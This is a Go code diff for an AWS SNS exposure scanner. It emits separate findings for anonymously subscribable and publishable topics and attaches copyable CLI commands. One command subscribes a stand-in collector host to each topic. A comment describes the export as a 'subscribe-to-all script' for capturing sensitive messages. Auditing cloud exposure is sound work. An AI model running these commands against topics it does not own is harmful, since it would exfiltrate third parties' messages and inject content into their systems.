@@ -61,6 +61,21 @@ func hasCondition(raw json.RawMessage) bool {
 	return s != "" && s != "{}" && s != "null"
 }
 
+// grants reports whether an action list permits the given verb ("subscribe",
+// "publish"), honouring the sns:* / * wildcards.
+func grants(actions []string, verb string) bool {
+	for _, a := range actions {
+		la := strings.ToLower(strings.TrimSpace(a))
+		if la == "*" || la == "sns:*" {
+			return true
+		}
+		if strings.Contains(la, verb) {
+			return true
+		}
+	}
+	return false
+}
+
 func asList(raw json.RawMessage) []string {
 	var s string
 	if err := json.Unmarshal(raw, &s); err == nil {
@@ -133,12 +148,7 @@ func scanRegion(ctx context.Context, t creds.AccountTarget, region string, sink 
 					topicName = topicARN[idx+1:]
 				}
 
-				title := fmt.Sprintf("SNS topic %s: public access (%s)", topicName, strings.Join(actions, ", "))
-				if cond {
-					title += " (conditional)"
-				}
-
-				// List existing subscriptions.
+				// List existing subscriptions (shared context for every finding).
 				var subs []map[string]string
 				subList, err := cli.ListSubscriptionsByTopic(ctx, &sns.ListSubscriptionsByTopicInput{
 					TopicArn: aws.String(topicARN),
@@ -153,45 +163,63 @@ func scanRegion(ctx context.Context, t creds.AccountTarget, region string, sink 
 					}
 				}
 
-				// Build copyable AWS CLI commands.
-				var cliCmds []string
-				for _, a := range actions {
-					switch {
-					case strings.Contains(a, "Subscribe") || a == "sns:*" || a == "SNS:*":
-						cliCmds = append(cliCmds,
-							fmt.Sprintf("aws sns subscribe --topic-arn '%s' --protocol email --notification-endpoint 'your@email.com' --region %s", topicARN, region))
-						cliCmds = append(cliCmds,
-							fmt.Sprintf("aws sns subscribe --topic-arn '%s' --protocol https --notification-endpoint 'https://your-webhook.example.com' --region %s", topicARN, region))
-					case strings.Contains(a, "Publish"):
-						cliCmds = append(cliCmds,
-							fmt.Sprintf("aws sns publish --topic-arn '%s' --message 'test' --region %s", topicARN, region))
-					case strings.Contains(a, "GetTopicAttributes"):
-						cliCmds = append(cliCmds,
-							fmt.Sprintf("aws sns get-topic-attributes --topic-arn '%s' --region %s", topicARN, region))
+				// Emit one finding per anonymous capability so Subscribe and
+				// Publish can be filtered (and exported) separately in the report.
+				// The `check` field drives the UI's per-check facet; `curl` holds
+				// copyable commands the "Export curls" button bulk-dumps — filter
+				// to public_subscribe, export, and you have a subscribe-to-all
+				// script for monitoring topics for sensitive data.
+				emit := func(check, title string, curls []string) {
+					t2 := title
+					if cond {
+						t2 += " (conditional)"
 					}
-				}
-				if len(cliCmds) == 0 {
-					cliCmds = append(cliCmds,
-						fmt.Sprintf("aws sns subscribe --topic-arn '%s' --protocol email --notification-endpoint 'your@email.com' --region %s", topicARN, region))
+					_ = sink.Write(ctx, findings.Finding{
+						AccountID:   t.AccountID,
+						Region:      region,
+						Module:      "public_sns",
+						Severity:    sev,
+						ResourceARN: topicARN,
+						Title:       t2,
+						Detail: map[string]any{
+							"check":         check,
+							"topic_name":    topicName,
+							"topic_arn":     topicARN,
+							"actions":       actions,
+							"has_condition": cond,
+							"subscriptions": subs,
+							"statement":     st,
+							"curl":          curls,
+						},
+					})
 				}
 
-				_ = sink.Write(ctx, findings.Finding{
-					AccountID:   t.AccountID,
-					Region:      region,
-					Module:      "public_sns",
-					Severity:    sev,
-					ResourceARN: topicARN,
-					Title:       title,
-					Detail: map[string]any{
-						"topic_name":     topicName,
-						"topic_arn":      topicARN,
-						"actions":        actions,
-						"has_condition":  cond,
-						"subscriptions":  subs,
-						"statement":      st,
-						"curl":           cliCmds,
-					},
-				})
+				emitted := false
+				if grants(actions, "subscribe") {
+					emitted = true
+					emit("public_subscribe",
+						fmt.Sprintf("SNS topic %s: anonymous Subscribe — anyone can subscribe an endpoint and receive every message", topicName),
+						[]string{
+							fmt.Sprintf("aws sns subscribe --region %s --topic-arn '%s' --protocol https --notification-endpoint 'https://YOUR-COLLECTOR.example/%s' --return-subscription-arn", region, topicARN, topicName),
+							fmt.Sprintf("aws sns subscribe --region %s --topic-arn '%s' --protocol email --notification-endpoint 'you@example.com'", region, topicARN),
+						})
+				}
+				if grants(actions, "publish") {
+					emitted = true
+					emit("public_publish",
+						fmt.Sprintf("SNS topic %s: anonymous Publish — anyone can inject messages", topicName),
+						[]string{
+							fmt.Sprintf("aws sns publish --region %s --topic-arn '%s' --message 'bezosbuster-test'", region, topicARN),
+						})
+				}
+				if !emitted {
+					// Some other anonymous action (management / GetTopicAttributes).
+					emit("public_other",
+						fmt.Sprintf("SNS topic %s: anonymous access (%s)", topicName, strings.Join(actions, ", ")),
+						[]string{
+							fmt.Sprintf("aws sns get-topic-attributes --region %s --topic-arn '%s'", region, topicARN),
+						})
+				}
 			}
 		}
 		if list.NextToken == nil {
